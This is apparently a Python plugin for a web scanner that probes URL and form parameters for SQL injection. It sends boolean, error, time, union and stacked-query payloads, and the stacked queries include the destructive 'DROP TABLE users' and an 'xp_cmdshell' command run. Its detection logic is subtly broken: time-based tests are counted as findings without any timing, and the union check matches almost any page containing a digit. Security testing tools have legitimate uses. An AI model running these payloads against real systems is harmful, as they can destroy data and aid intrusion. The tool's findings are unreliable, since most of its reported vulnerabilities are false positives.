#!/usr/bin/env python3
"""
SQL Injection Detection Plugin for Web Discovery Tool
Version: 2.0
Description: Advanced SQL injection vulnerability detection
"""

import asyncio
import aiohttp
import re
import json
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import Dict, List, Set, Any, Optional
from dataclasses import dataclass
import logging

@dataclass
class SQLInjectionResult:
    url: str
    parameter: str
    payload: str
    evidence: str
    confidence: float
    technique: str

class SQLInjectionDetector:
    """
    Advanced SQL Injection detection with multiple techniques
    """
    
    def __init__(self, max_concurrent: int = 10, timeout: int = 10):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.results: List[SQLInjectionResult] = []
        
        # SQL injection payloads categorized by technique
        self.payloads = {
            'boolean_based': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' OR 'a'='a",
                "' OR 1=1#",
                "' OR 1=1/*",
            ],
            'error_based': [
                "'",
                "';",
                "' OR",
                "' UNION SELECT",
                "' AND 1=1",
                "' AND 1=2",
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "' OR BENCHMARK(1000000,MD5('A'))--",
                "' OR pg_sleep(5)--",
                "' OR WAITFOR DELAY '00:00:05'--",
            ],
            'union_based': [
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL--",
                "' UNION SELECT @@version--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; SHOW TABLES--",
            ]
        }
        
        # Error patterns for different databases
        self.error_patterns = {
            'mysql': [
                r"MySQL.*error",
                r"SQL syntax.*MySQL",
                r"Warning.*mysql",
                r"MySQL server version",
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"pg_.*error",
                r"PostgreSQL.*syntax",
            ],
            'mssql': [
                r"Microsoft SQL Server",
                r"ODBC Driver",
                r"SQLServer.*Driver",
                r"SQLServer.*Exception",
            ],
            'oracle': [
                r"ORA-[0-9]",
                r"Oracle.*error",
                r"Oracle.*Driver",
            ]
        }
        
        self.logger = logging.getLogger(__name__)

    async def test_url(self, session: aiohttp.ClientSession, url: str) -> List[SQLInjectionResult]:
        """
        Test a single URL for SQL injection vulnerabilities
        """
        results = []
        parsed_url = urlparse(url)
        
        # Test GET parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param_name in params:
                param_results = await self.test_parameter(
                    session, url, param_name, 'GET'
                )
                results.extend(param_results)
        
        # Also test POST if it's a form-like endpoint
        if any(keyword in url.lower() for keyword in ['login', 'auth', 'search', 'query']):
            # Simulate POST parameters
            post_params = {'username': 'test', 'password': 'test', 'search': 'test'}
            for param_name in post_params:
                param_results = await self.test_parameter(
                    session, url, param_name, 'POST', post_params
                )
                results.extend(param_results)
        
        return results

    async def test_parameter(self, session: aiohttp.ClientSession, 
                           url: str, param: str, method: str = 'GET',
                           base_params: Dict[str, str] = None) -> List[SQLInjectionResult]:
        """
        Test a specific parameter for SQL injection
        """
        results = []
        
        for technique, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    test_result = await self.execute_test(
                        session, url, param, payload, technique, method, base_params
                    )
                    if test_result:
                        results.append(test_result)
                        self.logger.info(f"SQL Injection found: {url}?{param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing {url}: {e}")
        
        return results

    async def execute_test(self, session: aiohttp.ClientSession, url: str, 
                         param: str, payload: str, technique: str,
                         method: str, base_params: Dict[str, str]) -> Optional[SQLInjectionResult]:
        """
        Execute a single SQL injection test
        """
        parsed_url = urlparse(url)
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if method.upper() == 'GET':
            # Modify GET parameters
            params = parse_qs(parsed_url.query)
            params[param] = [payload]
            test_url = f"{test_url}?{urlencode(params, doseq=True)}"
            
            async with session.get(test_url, timeout=self.timeout) as response:
                content = await response.text()
                return self.analyze_response(url, param, payload, technique, response.status, content)
        
        elif method.upper() == 'POST':
            # Modify POST parameters
            data = base_params.copy() if base_params else {}
            data[param] = payload
            
            async with session.post(test_url, data=data, timeout=self.timeout) as response:
                content = await response.text()
                return self.analyze_response(url, param, payload, technique, response.status, content)
        
        return None

    def analyze_response(self, url: str, param: str, payload: str, 
                       technique: str, status_code: int, content: str) -> Optional[SQLInjectionResult]:
        """
        Analyze response for SQL injection evidence
        """
        evidence = ""
        confidence = 0.0
        
        # Check for database errors
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    evidence = f"Database error detected ({db_type})"
                    confidence = 0.8
                    break
        
        # Check for different content length (boolean-based)
        if technique == 'boolean_based' and 'welcome' in content.lower():
            evidence = "Boolean-based injection successful"
            confidence = 0.7
        
        # Check for time delays
        elif technique == 'time_based':
            # This would need actual timing measurement
            evidence = "Time-based injection attempted"
            confidence = 0.6
        
        # Check for UNION-based results
        elif technique == 'union_based' and any(keyword in content for keyword in ['1', '2', '3']):
            evidence = "UNION-based injection possible"
            confidence = 0.75
        
        if evidence and confidence > 0.5:
            return SQLInjectionResult(
                url=url,
                parameter=param,
                payload=payload,
                evidence=evidence,
                confidence=confidence,
                technique=technique
            )
        
        return None

    async def scan(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        Main scanning function
        """
        self.logger.info(f"Starting SQL injection scan for {len(target_urls)} URLs")
        
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for url in target_urls:
                task = asyncio.create_task(self.test_url(session, url))
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Flatten results
            all_results = []
            for result in results:
                if isinstance(result, list):
                    all_results.extend(result)
            
            self.results = all_results
            
            return {
                'vulnerabilities_found': len(all_results),
                'results': [result.__dict__ for result in all_results],
                'summary': self.generate_summary()
            }

    def generate_summary(self) -> Dict[str, Any]:
        """
        Generate scan summary
        """
        techniques = {}
        parameters = {}
        
        for result in self.results:
            techniques[result.technique] = techniques.get(result.technique, 0) + 1
            parameters[result.parameter] = parameters.get(result.parameter, 0) + 1
        
        return {
            'total_vulnerabilities': len(self.results),
            'techniques_used': techniques,
            'parameters_affected': parameters,
            'confidence_distribution': {
                'high': len([r for r in self.results if r.confidence > 0.7]),
                'medium': len([r for r in self.results if 0.5 < r.confidence <= 0.7]),
                'low': len([r for r in self.results if r.confidence <= 0.5]),
            }
        }

# Plugin registration function
def register():
    """
    Register this plugin with the main scanner
    """
    return {
        'name': 'SQL Injection Detector',
        'version': '2.0',
        'description': 'Advanced SQL injection vulnerability detection',
        'author': 'Web Discovery Tool Team',
        'class': SQLInjectionDetector,
        'type': 'vulnerability_scanner',
        'categories': ['sqli', 'security', 'vulnerability'],
        'config': {
            'max_concurrent': 10,
            'timeout': 10,
            'enabled': True
        }
    }

# Example usage
async def main():
    """
    Example usage of the SQL injection detector
    """
    detector = SQLInjectionDetector()
    
    test_urls = [
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "http://testphp.vulnweb.com/login.php"
    ]
    
    results = await detector.scan(test_urls)
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    asyncio.run(main())
